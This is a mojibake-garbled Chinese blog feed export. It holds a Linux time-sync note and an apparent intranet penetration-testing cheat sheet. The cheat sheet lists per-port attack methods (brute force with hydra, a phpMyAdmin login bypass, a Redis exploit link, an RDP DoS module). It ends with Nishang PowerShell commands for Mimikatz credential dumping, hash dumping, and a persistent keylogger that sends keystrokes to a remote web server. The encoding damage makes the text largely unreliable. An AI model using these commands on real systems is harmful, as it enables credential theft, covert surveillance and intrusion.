¼æ—å¨æ²»æ ‡å‡†æ—¶é—´ UTCï¼šä¸–ç•Œåè°ƒæ—¶é—´ CSTï¼šChina Standard Time UT+8:00 NTPåè®® NTPå®¢æˆ·ç«¯ å®¢æˆ·ç«¯ç¨‹åºä»æ—¶é—´æœåŠ¡å™¨åŒæ­¥æ—¶é—´ ç³»ç»Ÿå¯åŠ¨æ—¶è‡ªåŠ¨åŒæ­¥æ—¶é—´ ç½‘å£æ¿€æ´»æ—¶è‡ªåŠ¨åŒæ­¥è¿è¡Œ æ‰‹åŠ¨åŒæ­¥æ—¶é—´ # æ–°ç‰ˆç³»ç»Ÿï¼ŒæŸ¥çœ‹å®¢æˆ·ç«¯æ—¶é—´ timedatectl # RTCæ—¶é—´ï¼šç¡¬ä»¶æ—¶é—´ æ–°ç‰ˆç³»ç»Ÿä½¿ç”¨timesyncdå®¢æˆ·ç«¯åŒæ­¥æ—¶é—´å‘è¿™ä¸ªåŸŸåè¯·æ±‚ï¼šntp.ubuntu.com timedatectrl list-timezones #åˆ—å‡ºæ‰€æœ‰æ—¶åŒº timedatectrl set-timezone #è®¾ç½®æ—¶åŒº timedatectrl set-time "2019-10-01 18:18:18" #è®¾ç½®ç³»ç»Ÿæ—¶é—´ timedatectl set-ntp true #å¼€å§‹ç½‘ç»œåŒæ­¥ systemctl status systemd-timesyncd.service # æŸ¥çœ‹æ—¶é—´æœåŠ¡çŠ¶æ€ # ç¡¬ä»¶æ—¶é—´(RTC)ä¸UTCæ—¶é—´åŒæ­¥ sudo hwclock -w # å°†ç³»ç»Ÿæ—¶é—´å†™å…¥åˆ°RTCæ—¶é—´ sudo hwlock -s # å°†ç¡¬ä»¶ hwclock --set --date='2019-10-01 18:18:18' # é…ç½®æ–‡ä»¶ /etc/systemd/timesyncd.conf ä¸€ä¸ªè¿‡æ—¶çš„ä¸œè¥¿(ntpdate)æ–°ç‰ˆæœ¬ç³»ç»Ÿä½¿ç”¨timesyncdæ›¿æ¢ntpdçš„å®¢æˆ·ç«¯åŠŸèƒ½ä¸€æ—¦å®‰è£…äº†ntpdate / ntp, timedatectrlå°†è¢«ç¦ç”¨ ntpd â€“ å®¢æˆ·ç«¯+æœåŠ¡å™¨ æŠŠæœºå™¨è®¾ç½®æˆæ—¶é—´æœåŠ¡å™¨`bash apt install ntp # å®‰è£…ntpæœåŠ¡systemctl start ntp # å¯åŠ¨æœåŠ¡(123ç«¯å£å°±è¢«æ‰“å¼€äº†)systemctl status ntp # æŸ¥è¯¢æœåŠ¡çŠ¶æ€systemctl restart ntp # é‡å¯æœåŠ¡ ##é…ç½®æ–‡ä»¶ï¼ˆæˆ‘ä¹Ÿè¦è·Ÿä¸Šä¸€çº§çš„æ—¶é—´æœåŠ¡å™¨åŒæ­¥ï¼‰vim /etc/ntp.conf #å¦‚æœä¸ä½¿ç”¨å®˜æ–¹çš„æ—¶é—´æœåŠ¡å™¨ï¼Œå¯ä»¥è‡ªå·±æŒ‡å®šserver 1.1.1.1 #é¦–é€‰ç½‘ç»œæ—¶é—´æœåŠ¡å™¨ä¸å¯ç”¨çš„æ—¶å€™ï¼Œä½¿ç”¨æœ¬æœºå§‹ç»ˆä½œä¸ºå¤‡ç”¨æ—¶é—´æºfudge 127.127.1.1 startum 10 # å±‚çº§è®¾ç½®ä½ç‚¹( startum 10, è¿™é‡Œè®¾ç½®ä¸º10å±‚) é…ç½®æ–‡ä»¶ä¸­ï¼Œä¸»è¦çš„æ—¶é—´æœåŠ¡å™¨å¦‚ä¸‹ &lt;img src="http://image.xpshuai.cn/20200308171832987_9157.png"&gt;&lt;/img&gt; ###### å‘½ä»¤: ntpq -- ntpæœåŠ¡ç«¯çš„æŸ¥è¯¢å‘½ä»¤ ```bash ntpq -p #å‘½ä»¤æ‰§è¡Œç»“æœè¯¦è§£å¦‚ä¸‹å›¾ï¼š æ¯è¡Œå‰é¢ç¬¬ä¸€ä¸ªå­—ç¬¦å«ä¹‰ï¼š ç©º è¡¨ç¤ºæ— æ•ˆä¸»æœº x å·²ä¸å†ä½¿ç”¨ - å·²ä¸å†ä½¿ç”¨ # çŠ¶æ€è‰¯å¥½ä½†ä¸ºä½¿ç”¨ + è‰¯å¥½ä¸”ä¼˜å…ˆä½¿ç”¨ * é¦–é€‰ä¸»åŒæ­¥ä¸»æœº ï¼ˆä¸€èˆ¬æ˜¯startumå±‚çº§æœ€é«˜çš„ï¼‰ å…¶ä»–å‘½ä»¤#æŸ¥çœ‹æ—¥æœŸ date #è®¾ç½® date --set 1998-11-11 #æ‰‹åŠ¨è®¾ç½®æ—¥æœŸï¼ˆè¦é€šè¿‡ sudo timedatectl set-ntp 0 æ¥å…³æ‰ntpï¼‰ date --set 21:21:21 #è®¾ç½®æ—¶é—´ cat /etc/timezone #æŸ¥çœ‹æ—¶åŒº document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å†…ç½‘æ¸—é€]]></title>
    <url>%2Fposts%2F27104%2F</url>
    <content type="text"><![CDATA[å†…ç½‘åˆ†ç±»ï¼š å¸¦åŸŸç¯å¢ƒçš„å†…ç½‘ ä¸å¸¦åŸŸç¯å¢ƒçš„å†…ç½‘ ä¸€äº›ç«¯å£æ–‡ä»¶å…±äº«æœåŠ¡ç«¯å£æ¸—é€ æ¯”å¦‚å­¦æ ¡æœºæˆ¿æœ‰ä¸“é—¨ç”¨æ¥ä¸‹è½½æ–‡ä»¶çš„æœåŠ¡å™¨ ftpæœåŠ¡FTPæœåŠ¡ï¼š ftpæœåŠ¡æˆ‘åˆ†ä¸ºä¸¤ç§æƒ…å†µï¼Œç¬¬ä¸€ç§æ˜¯ä½¿ç”¨ç³»ç»Ÿè½¯ä»¶æ¥é…ç½®ï¼Œæ¯”å¦‚IISä¸­çš„FTPæ–‡ä»¶å…±äº«æˆ–Linuxä¸­çš„é»˜è®¤æœåŠ¡è½¯ä»¶ï¼›ç¬¬äºŒç§æ˜¯é€šè¿‡ç¬¬ä¸‰æ–¹è½¯ä»¶æ¥é…ç½®ï¼Œæ¯”å¦‚Serv-Uè¿˜æœ‰ä¸€äº›ç½‘ä¸Šå†™çš„ç®€æ˜“ftpæœåŠ¡å™¨ç­‰ï¼›é»˜è®¤ç«¯å£ï¼š20ï¼ˆæ•°æ®ç«¯å£ï¼‰ï¼›21ï¼ˆæ§åˆ¶ç«¯å£ï¼‰ï¼›69ï¼ˆtftpå°å‹æ–‡ä»¶ä¼ è¾“åè®®ï¼‰ æ”»å‡»æ–¹å¼ï¼š çˆ†ç ´ï¼šftpçš„çˆ†ç ´å·¥å…·æœ‰å¾ˆå¤šï¼šBruterï¼Œä»¥åŠmsfä¸­ftpçˆ†ç ´æ¨¡å—ï¼› åŒ¿åè®¿é—®ï¼šç”¨æˆ·åï¼šanonymous å¯†ç ï¼šä¸ºç©ºæˆ–ä»»æ„é‚®ç®± SambaæœåŠ¡SambaæœåŠ¡ï¼šå¯¹äºè¿™ä¸ªå¯ä»¥åœ¨windowsä¸Linuxä¹‹é—´è¿›è¡Œå…±äº«æ–‡ä»¶çš„æœåŠ¡åŒæ ·æ˜¯æˆ‘ä»¬æ”»å‡»çš„å…³æ³¨ç‚¹ï¼›sambaç™»å½•åˆ†ä¸ºä¸¤ç§æ–¹å¼ï¼Œä¸€ç§æ˜¯éœ€è¦ç”¨æˆ·åå£ä»¤ï¼›å¦ä¸€ç§æ˜¯ä¸éœ€è¦ç”¨æˆ·åå£ä»¤ã€‚åœ¨å¾ˆå¤šæ—¶å€™ä¸å…‰æ˜¯pcæœºï¼Œè¿˜æœ‰ä¸€äº›æœåŠ¡å™¨ï¼Œç½‘ç»œè®¾å¤‡éƒ½å¼€æ”¾ç€æ­¤æœåŠ¡ï¼Œæ–¹ä¾¿è¿›è¡Œæ–‡ä»¶å…±äº«ï¼Œä½†æ˜¯åŒæ—¶ä¹Ÿç»™æ”»å‡»è€…æä¾›äº†ä¾¿åˆ©ã€‚é»˜è®¤ç«¯å£ï¼š137ï¼ˆä¸»è¦ç”¨æˆ·NetBIOS Name Serviceï¼›NetBIOSåç§°æœåŠ¡ï¼‰ã€139ï¼ˆNetBIOS Session Serviceï¼Œä¸»è¦æä¾›sambaæœåŠ¡ï¼‰ æ”»å‡»æ–¹å¼ï¼š çˆ†ç ´ï¼šå¼±å£ä»¤ï¼ˆçˆ†ç ´å·¥å…·é‡‡ç”¨hydraï¼‰hydra -l username -P PassFile IP smb æœªæˆæƒè®¿é—®ï¼šç»™äºˆpublicç”¨æˆ·é«˜æƒé™ è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼šCVE-2015-0240ã€CVE-2017-7494ç­‰ç­‰ LDAPåè®®ldapï¼šè½»é‡çº§ç›®å½•è®¿é—®åè®®ï¼Œæœ€è¿‘å‡ å¹´éšç€ldapçš„å¹¿æ³›ä½¿ç”¨è¢«å‘ç°çš„æ¼æ´ä¹Ÿè¶Šæ¥è¶Šå¤šã€‚ä½†æ˜¯æ¯•ç«Ÿä¸»æµçš„æ”»å‡»æ–¹å¼ä»æ—§æ˜¯é‚£äº›ï¼Œæ¯”å¦‚æ³¨å…¥ï¼Œæœªæˆæƒç­‰ç­‰ï¼›è¿™äº›é—®é¢˜çš„å‡ºç°ä¹Ÿéƒ½æ˜¯å› ä¸ºé…ç½®ä¸å½“è€Œé€ æˆçš„ã€‚é»˜è®¤ç«¯å£ï¼š389 æ”»å‡»æ–¹å¼ï¼š æ³¨å…¥æ”»å‡»ç›²æ³¨ æœªæˆæƒè®¿é—® çˆ†ç ´ï¼šå¼±å£ä»¤ è¿œç¨‹è¿æ¥æœåŠ¡ç«¯å£æ¸—é€SSHæœåŠ¡SSHæœåŠ¡ï¼š è¿™ä¸ªæœåŠ¡åŸºæœ¬ä¼šå‡ºç°åœ¨æˆ‘ä»¬çš„LinuxæœåŠ¡å™¨ï¼Œç½‘ç»œè®¾å¤‡ï¼Œå®‰å…¨è®¾å¤‡ç­‰è®¾å¤‡ä¸Šï¼Œè€Œä¸”å¾ˆå¤šæ—¶å€™è¿™ä¸ªæœåŠ¡çš„é…ç½®éƒ½æ˜¯é»˜è®¤çš„ï¼›å¯¹äºSSHæœåŠ¡æˆ‘ä»¬å¯èƒ½ä½¿ç”¨çˆ†ç ´æ”»å‡»æ–¹å¼è¾ƒå¤šã€‚é»˜è®¤ç«¯å£ï¼š 22 æ”»å‡»æ–¹å¼ï¼š çˆ†ç ´ï¼š å¼±å£ä»¤ æ¼æ´ï¼š28é€€æ ¼æ¼æ´ã€OpenSSLæ¼æ´ TelentæœåŠ¡TelnetæœåŠ¡ï¼šåœ¨SSHæœåŠ¡å´›èµ·çš„ä»Šå¤©æˆ‘ä»¬å·²ç»å¾ˆéš¾è§åˆ°ä½¿ç”¨telnetçš„æœåŠ¡å™¨ï¼Œä½†æ˜¯åœ¨å¾ˆå¤šè®¾å¤‡ä¸ŠåŒæ ·è¿˜æ˜¯æœ‰è¿™ä¸ªæœåŠ¡çš„ï¼›æ¯”å¦‚ciscoã€åä¸‰ï¼Œæ·±ä¿¡æœç­‰å‚å•†çš„è®¾å¤‡ï¼›æˆ‘å°±æœ‰å¾ˆå¤šæ¬¡é€šè¿‡telnetå¼±å£ä»¤æ§åˆ¶è¿™äº›è®¾å¤‡ï¼›é»˜è®¤ç«¯å£ï¼š 23 æ”»å‡»æ–¹å¼ï¼š çˆ†ç ´ï¼šå¼±å£ä»¤ å—…æ¢ï¼šæ­¤ç§æƒ…å†µä¸€èˆ¬å‘ç”Ÿåœ¨å±€åŸŸç½‘ è¿œç¨‹æ¡Œé¢è¿æ¥è¿œç¨‹æ¡Œé¢è¿æ¥ï¼šä½œä¸ºwindowsä¸Šè¿›è¡Œè¿œç¨‹è¿æ¥çš„ç«¯å£ï¼Œå¾ˆå¤šæ—¶å€™æˆ‘ä»¬åœ¨å¾—åˆ°ç³»ç»Ÿä¸ºwindowsçš„shellçš„æ—¶å€™æˆ‘ä»¬æ€»æ˜¯å¸Œæœ›å¯ä»¥ç™»å½•3389å®é™…æ“ä½œå¯¹æ–¹ç”µè„‘ï¼›è¿™ä¸ªæ—¶å€™æˆ‘ä»¬ä¸€èˆ¬çš„æƒ…å†µåˆ†ä¸ºä¸¤ç§ã€‚ä¸€ç§æ˜¯å†…ç½‘ï¼Œéœ€è¦å…ˆå°†ç›®æ ‡æœº3389ç«¯å£åå¼¹åˆ°å¤–ç½‘ï¼›å¦ä¸€ç§å°±æ˜¯å¤–ç½‘ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥è®¿é—®ï¼›å½“ç„¶è¿™ä¸¤ç§æƒ…å†µæˆ‘ä»¬åˆ©ç”¨èµ·æ¥å¯èƒ½éœ€è¦å¾ˆè‹›åˆ»çš„æ¡ä»¶ï¼Œæ¯”å¦‚æ‰¾åˆ°ç™»å½•å¯†ç ç­‰ç­‰ï¼›é»˜è®¤ç«¯å£ï¼š 3389 æ”»å‡»æ–¹å¼ï¼š çˆ†ç ´ï¼š3389ç«¯å£çˆ†ç ´å·¥å…·å°±æœ‰ç‚¹å¤šäº†(7kbScan-RDP-Sniperï¼Œmsfçš„çˆ†ç ´æ¨¡å—) Shiftç²˜æ»é”®åé—¨ï¼š5æ¬¡shiftåé—¨ 3389æ¼æ´æ”»å‡»ï¼šåˆ©ç”¨ms12-020æ”»å‡»3389ç«¯å£ï¼Œå¯¼è‡´æœåŠ¡å™¨å…³æœºï¼ˆmsfçš„æ¨¡å—æœ‰æ£€æµ‹auxiliary/scanner/rdp/ms_12_â€¦ï¼Œåˆ©ç”¨æ¨¡å—auxiliary/dos/windows/rdp/ms12_020_maxchannelidsï¼‰ VNCæœåŠ¡VNCæœåŠ¡: ä¸€æ¬¾ä¼˜ç§€çš„è¿œæ§å·¥å…·ï¼Œå¸¸ç”¨è¯­ç±»UNIXç³»ç»Ÿä¸Šï¼Œç®€å•åŠŸèƒ½å¼ºå¤§ï¼›ä¹Ÿé»˜è®¤ç«¯å£ï¼š5900+æ¡Œé¢IDï¼ˆ5901ï¼›5902ï¼‰ æ”»å‡»æ–¹å¼ï¼š çˆ†ç ´ï¼šå¼±å£ä»¤ è®¤è¯å£ä»¤ç»•è¿‡ï¼š æ‹’ç»æœåŠ¡æ”»å‡»ï¼šï¼ˆCVE-2015-5239ï¼‰ æƒé™æå‡ï¼šï¼ˆCVE-2013-6886ï¼‰ ç¬¬ä¸‰æ–¹è½¯ä»¶â€¦ â€¦ Webåº”ç”¨æœåŠ¡ç«¯å£æ¸—é€1.ä¸­é—´ä»¶å¹³å°æ¸—é€IIS Apache Nginx Weblogic tomcat Jboos Websphereç­‰ # å¯ä½¿ç”¨vulhubé¶åœºæµ‹è¯• `ä¸­é—´ä»¶æ¼æ´é›†åˆPDF`ï¼Œ `æœªæˆæƒè®¿é—®é›†åˆPDF` 2.WEBåº”ç”¨ç¨‹åºæ¸—é€ å·²çŸ¥CMS æœªçŸ¥CMS å¸¸è§„æ¼æ´æµ‹è¯• æ•°æ®åº“æœåŠ¡ç«¯å£æ¸—é€é’ˆå¯¹æ‰€æœ‰çš„ æ•°æ®åº“æ”»å‡»æ–¹å¼éƒ½å­˜åœ¨SQLæ³¨å…¥ï¼Œè¿™é‡Œå…ˆæå‡ºæ¥åœ¨ä¸‹é¢å°±ä¸ä¸€ä¸€å†™äº†å…å¾—å¤§å®¶è¯´æˆ‘å ç¯‡å¹…ï¼›å½“ç„¶ä¸åŒçš„æ•°æ®åº“æ³¨å…¥æŠ€å·§å¯èƒ½ä¸ä¸€æ ·ï¼Œç‰¹åˆ«æ˜¯NoSQLä¸ä¼ ç»Ÿçš„SQLæ•°æ®åº“ä¸å¤ªä¸€æ ·ã€‚ä½†æ˜¯è¿™ä¸æ˜¯æœ¬æ–‡éœ€è¦ä»‹ç»çš„é‡ç‚¹ï¼Œåé¢æœ‰æ—¶é—´ä¼šå†™ä¸€ç¯‡ä¸åŒæ•°æ®åº“çš„æ¸—é€æŠ€å·§ã€‚ MySQLæ•°æ®åº“é»˜è®¤ç«¯å£ï¼š 3306 æ”»å‡»æ–¹å¼ï¼š çˆ†ç ´ï¼šå¼±å£ä»¤ èº«ä»½è®¤è¯æ¼æ´ï¼šCVE-2012-2122 æ‹’ç»æœåŠ¡æ”»å‡»ï¼šåˆ©ç”¨sqlè¯­å¥æ˜¯æœåŠ¡å™¨è¿›è¡Œæ­»å¾ªç¯æ‰“æ­»æœåŠ¡å™¨ Phpmyadminä¸‡èƒ½å¯†ç ç»•è¿‡ï¼šç”¨æˆ·åï¼šâ€˜localhostâ€™@â€™@â€ å¯†ç ä»»æ„ MSSQLæ•°æ®åº“é»˜è®¤ç«¯å£ï¼š1433ï¼ˆServer æ•°æ®åº“æœåŠ¡ï¼‰ã€1434ï¼ˆMonitor æ•°æ®åº“ç›‘æ§ï¼‰ æ”»å‡»æ–¹å¼ï¼š çˆ†ç ´ï¼šå¼±å£ä»¤ Oracleæ•°æ®åº“é»˜è®¤ç«¯å£ï¼š1521ï¼ˆæ•°æ®åº“ç«¯å£ï¼‰ã€1158ï¼ˆOracle EMCTLç«¯å£ï¼‰ã€8080ï¼ˆOracle XDBæ•°æ®åº“ï¼‰ã€210ï¼ˆOracle XDB FTPæœåŠ¡ï¼‰ æ”»å‡»æ–¹å¼ï¼š çˆ†ç ´ï¼šå¼±å£ä»¤ æ¼æ´æ”»å‡» PostgreSQLæ•°æ®åº“PostgreSQLæ˜¯ä¸€ç§ç‰¹æ€§éå¸¸é½å…¨çš„è‡ªç”±è½¯ä»¶çš„å¯¹è±¡â€“å…³ç³»å‹æ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼Œå¯ä»¥è¯´æ˜¯ç›®å‰ä¸–ç•Œä¸Šæœ€å…ˆè¿›ï¼ŒåŠŸèƒ½æœ€å¼ºå¤§çš„è‡ªç”±æ•°æ®åº“ç®¡ç†ç³»ç»Ÿã€‚åŒ…æ‹¬æˆ‘ä»¬kaliç³»ç»Ÿä¸­msfä¹Ÿä½¿ç”¨è¿™ä¸ªæ•°æ®åº“ï¼›æµ…è°ˆpostgresqlæ•°æ®åº“æ”»å‡»æŠ€æœ¯ å¤§éƒ¨åˆ†å…³äºå®ƒçš„æ”»å‡»ä¾æ—§æ˜¯sqlæ³¨å…¥ï¼Œæ‰€ä»¥æ³¨å…¥æ‰æ˜¯æ•°æ®åº“ä¸å˜çš„è¯é¢˜ã€‚é»˜è®¤ç«¯å£ï¼š 5432 æ”»å‡»æ–¹å¼ï¼š çˆ†ç ´å¼±å£ä»¤ï¼špostgres postgres ç¼“å†²åŒºæº¢å‡ºï¼šCVE-2014-2669 MongoDBæ•°æ®åº“MongoDBï¼šNoSQLæ•°æ®åº“ï¼›æ”»å‡»æ–¹æ³•ä¸å…¶ä»–æ•°æ®åº“ç±»ä¼¼ï¼›å…³äºå®ƒçš„å®‰å…¨è®²è§£ï¼šè¯·å‚è€ƒé»˜è®¤ç«¯å£ï¼š 27017 æ”»å‡»æ–¹å¼ï¼š çˆ†ç ´å¼±å£ä»¤ æœªæˆæƒè®¿é—® Redisæ•°æ®åº“redisï¼šæ˜¯ä¸€ä¸ªå¼€æºçš„ä½¿ç”¨cè¯­è¨€å†™çš„ï¼Œæ”¯æŒç½‘ç»œã€å¯åŸºäºå†…å­˜äº¦å¯æŒä¹…åŒ–çš„æ—¥å¿—å‹ã€key-valueæ•°æ®åº“ã€‚å…³äºè¿™ä¸ªæ•°æ®åº“è¿™ä¸¤å¹´è¿˜æ˜¯å¾ˆç«çš„ï¼Œæš´éœ²å‡ºæ¥çš„é—®é¢˜ä¹Ÿå¾ˆå¤šã€‚ç‰¹åˆ«æ˜¯å‰æ®µæ—¶é—´æš´éœ²çš„æœªæˆæƒè®¿é—®ã€‚ Expï¼šhttps://yunpan.cn/cYjzHxawFpyVt è®¿é—®å¯†ç  e547é»˜è®¤ç«¯å£ï¼š 6379 æ”»å‡»æ–¹å¼ï¼š çˆ†ç ´å¼±å£ä»¤ æœªæˆæƒè®¿é—®+é…åˆssh keyææƒ SysBaseæ•°æ®åº“é»˜è®¤ç«¯å£ï¼šæœåŠ¡ç«¯å£5000ï¼›ç›‘å¬ç«¯å£4100ï¼›å¤‡ä»½ç«¯å£ï¼š4200 æ”»å‡»æ–¹å¼ï¼š çˆ†ç ´ï¼š å¼±å£ä»¤; å‘½ä»¤æ³¨å…¥ DB2æ•°æ®åº“é»˜è®¤ç«¯å£ï¼š5000 æ”»å‡»æ–¹å¼ï¼š å®‰å…¨é™åˆ¶ç»•è¿‡ï¼šæˆåŠŸåå¯æ‰§è¡Œæœªæˆæƒæ“ä½œï¼ˆCVE-2015-1922ï¼‰ æ€»ç»“ä¸€ä¸‹ï¼šå¯¹äºæ•°æ®åº“ï¼Œæˆ‘ä»¬å¾—çŸ¥ç«¯å£å¾ˆå¤šæ—¶å€™å¯ä»¥å¸®åŠ©æˆ‘ä»¬å»æ¸—é€ï¼Œæ¯”å¦‚å¾—çŸ¥mysqlçš„ æ•°æ®åº“ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨SQLæ³¨å…¥è¿›è¡Œmofã€udfç­‰æ–¹å¼ææƒï¼›å¦‚æœæ˜¯mssqlæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨xp_cmdshellæ¥è¿›è¡Œææƒï¼›å¦‚æœæ˜¯å…¶å®ƒçš„æ•°æ® åº“ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é‡‡ç”¨å¯¹åº”çš„æ–¹å¼ï¼›æ¯”å¦‚å„å¤§æ•°æ®åº“å¯¹åº”å®ƒä»¬çš„é»˜è®¤å£ä»¤ï¼Œç‰ˆæœ¬å¯¹åº”çš„æ¼æ´ï¼ é‚®ä»¶æœåŠ¡ç«¯å£æ¸—é€SMTPåè®®smtpï¼šé‚®ä»¶åè®®ï¼Œåœ¨linuxä¸­é»˜è®¤å¼€å¯è¿™ä¸ªæœåŠ¡ï¼Œå¯ä»¥å‘å¯¹æ–¹å‘é€é’“é±¼é‚®ä»¶ï¼é»˜è®¤ç«¯å£ï¼š 25ï¼ˆsmtpï¼‰ã€465ï¼ˆsmtpsï¼‰ æ”»å‡»æ–¹å¼ï¼š çˆ†ç ´ï¼šå¼±å£ä»¤ æœªæˆæƒè®¿é—® POP3åè®®é»˜è®¤ç«¯å£ï¼š 109ï¼ˆPOP2ï¼‰ã€110ï¼ˆPOP3ï¼‰ã€995ï¼ˆPOP3Sï¼‰ æ”»å‡»æ–¹å¼ï¼š çˆ†ç ´å¼±å£ä»¤ æœªæˆæƒè®¿é—® IMAPåè®®é»˜è®¤ç«¯å£ï¼š143ï¼ˆimapï¼‰ã€993ï¼ˆimapsï¼‰ æ”»å‡»æ–¹å¼ï¼š çˆ†ç ´ï¼šå¼±å£ä»¤ é…ç½®ä¸å½“ ç½‘ç»œå¸¸è§åè®®ç«¯å£æ¸—é€DNSæœåŠ¡é»˜è®¤ç«¯å£ï¼š 53 æ”»å‡»æ–¹å¼ï¼š åŒºåŸŸä¼ è¾“æ¼æ´ DHCPæœåŠ¡é»˜è®¤ç«¯å£ï¼š67&amp;68ã€546ï¼ˆDHCP FailoveråšåŒæœºçƒ­å¤‡çš„ï¼‰ æ”»å‡»æ–¹å¼ï¼š DHCPåŠ«æŒ SNMPåè®®é»˜è®¤ç«¯å£ï¼š 161æ”»å‡»æ–¹å¼: çˆ†ç ´å¼±å£ä»¤ Powershellæ¡†æ¶ æ¨èä½¿ç”¨ NiShang å‚è€ƒæ–‡ç« ï¼šhttps://www.4hou.com/posts/E99ml ä¸‹è½½åœ°å€: https://github.com/samratashok/nishang å„ç§å‘½ä»¤è§£æï¼š https://www.explainshell.com å®‰è£…é—®é¢˜nishangçš„ä½¿ç”¨æ˜¯è¦åœ¨PowerShell3.0ä»¥ä¸Šçš„ç¯å¢ƒä¸­æ‰å¯ä»¥æ­£å¸¸ä½¿ç”¨ã€‚ä¹Ÿå°±æ˜¯è¯´win7ä¸‹æ˜¯æœ‰ç‚¹å°é—®é¢˜çš„ï¼ˆwin7ä¸‹è‡ªå¸¦çš„ç¯å¢ƒæ˜¯PowerShell 2.0ï¼Œ è‡ªè¡Œå‡çº§ï¼‰ powershell ISEæ˜¯ä¸€ä¸ªç¼–è¯‘å™¨ powershellæœ‰å¾ˆå¤šæ¸—é€æ¡†æ¶ï¼š PowerSploit(æœ€å¤šï¼Œä½†æ˜¯æ²¡ç»´æŠ¤äº†)ã€Empireã€NiShang(ä¸€ç›´æ›´æ–°ï¼Œæ¨è), å­¦ä¸€ç§å°±è¡Œï¼Œå¤§åŒå°å¼‚ å®é™…æ¸—é€ä¸­ï¼Œè‚¯å®šä¸èƒ½æŠŠNishangæ•´ä¸ªç›®å½•éƒ½è¯»åˆ°ç›®æ ‡æœåŠ¡å™¨ä¸Šï¼Œæ‰€ä»¥åœ¨ä¸‹è½½æŸä¸€ä¸ªè„šæœ¬çš„æ—¶å€™ï¼Œäº†è§£ç›®å½•ç»“æ„å¾ˆé‡è¦ ç›®å½•ç»“æ„ï¼š æ¨¡å—å’ŒåŠŸèƒ½ä»‹ç»ï¼š æ¼”ç¤ºï¼šç«¯å£æ‰«æ å¯†ç è·å– é”®ç›˜è®°å½• åå¼¹ä¼šè¯ å£ä»¤çˆ†ç ´ å®æˆ˜åº”ç”¨ï¼š åç»­æ§åˆ¶ åŸŸæ¸—é€ ç³»ç»Ÿææƒ # ä½¿ç”¨ï¼Œå¯¼å…¥æ¡†æ¶ï¼ˆå¦‚æœå‡ºé”™ï¼Œé‡æ–°ä»¥ç®¡ç†å‘˜è¿è¡Œ:æ‰§è¡Œ`Set-ExecutionPolicy remotesigned`ï¼‰ Import-Module .nishang.psml # è½½å…¥æ¨¡å— æŸ¥çœ‹NiShangéƒ½æœ‰å“ªäº›æ¨¡å— Get-Command -Moudle nishang ## æŸ¥çœ‹æœºå™¨åŸºæœ¬ä¿¡æ¯ Get-Information # æŠŠç»“æœå¯¼å‡ºæ–‡ä»¶ Out-File Get-Information | Out-File res.txt # æ£€æµ‹æ˜¯å¦ä¸ºè™šæ‹Ÿæœº Check-VM ## è·å–å¯†ç  Invoke-Minikatz #Dumpå‡ºæœ¬æœºçš„å‡­è¯ä¿¡æ¯ Invoke-Minikatz -DumpCerts #dumpå‡ºè¿œç¨‹çš„ä¸¤å°è®¡ç®—æœºçš„å‡­è¯ä¿¡æ¯ Invoke-Minikatz -ComputerName @("computer1", "computer2") #åœ¨è¿œç¨‹çš„ä¸€å°æœºå™¨ä¸Šè¿è¡ŒMimikatz å¹¶æ‰§è¡Œ "privilege::debug exit" Invoke-Minikatz -Command "privilege::debug exit" -ComputerName@("computer1") # Get-PassHashes è·å–å¯†ç  # åœ¨administratorçš„æƒé™ä¸‹å¯ä»¥dumpå‡ºå¯†ç hashå€¼ï¼ˆåœ¨åœ¨msfä¸­çš„power dumpæ¨¡å—è¿›è¡Œäº†ä¿®æ”¹ï¼Œä¸éœ€è¦systemæƒé™å°±å¯ä»¥dumpï¼‰ Get-PassHashes # è·å–ç”¨æˆ·çš„å¯†ç æç¤ºä¿¡æ¯(éœ€è¦æœ‰administratorçš„æƒé™) å¯ä»¥æ ¹æ®æç¤ºä¿¡æ¯ç”Ÿæˆå¯†ç å­—å…¸ï¼Œæé«˜çˆ†ç ´æˆåŠŸç‡ Get-PassHints ## è·å–å¸®åŠ©å‚æ•° Get-Help Get-Help Invoke-PortScan ## ç«¯å£æ‰«æ æŸ¥çœ‹å¸®åŠ©ä¿¡æ¯ Get-Help Invoke-PortScan -full Invoke-PortScan Invoke-PortScan -StartAddress 192.168.0.100 -EndAddress 192.168.0.155 -ResolveHost # cd åˆ‡æ¢åˆ°å¯¹åº”ç›®å½• ## æµ‹è¯•é”®ç›˜è®°å½•: Get-Help .\Keylogger.ps1 --full # æŸ¥çœ‹å¸®åŠ©ï¼ˆæä¾›äº†å››ç§æ–¹å¼è®°å½•ï¼‰ #-URL è¦æŠŠè®°å½•å‘Keyloggeré€åˆ°çš„ç½®é¡¶çš„è¿œç¨‹æœåŠ¡å™¨ , -CheckURL ä¼šæ£€æŸ¥æ‰€ç»™å‡ºçš„ç½‘é¡µä¸­æ˜¯å¤ŸåŒ…å«â€œMagicStringâ€ï¼Œ å¦‚æœæœ‰å°±åœæ­¢è®°å½• .\gather\Keylogger.ps1 -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -MagicString stopthis -exfil -ExfilOption WebServer -URL http://192.168.254.226/data/catch.php # è§£é‡Šï¼š å°†è®°å½•æŒ‡å®šå‘é€ç»™ä¸€ä¸ªå¯ä»¥è®°å½•Postè¯·æ±‚çš„WebæœåŠ¡å™¨ # é»˜è®¤ä¿å­˜åˆ°(å†…å®¹æ˜¯asciiç )ï¼š Windows/Temp/key.log # æŠŠasciiè®°å½•è§£æä¸ºéasciiï¼š Parse_Keys .\key.log .\parsed.txt # æŒä¹…åŒ–è®°å½•ï¼ˆé‡å¯ä¹‹åä¹Ÿè®°å½•ï¼‰ .\Keylogger.ps1 -persist ## çˆ†ç ´å£ä»¤ åœ¨scanç›®å½•ä¸‹é¢ #ç”¨äºå¯¹SQL Serverã€åŸŸæ§åˆ¶å™¨ã€Webå’ŒFTPå¼±å£ä»¤çˆ†ç ´ 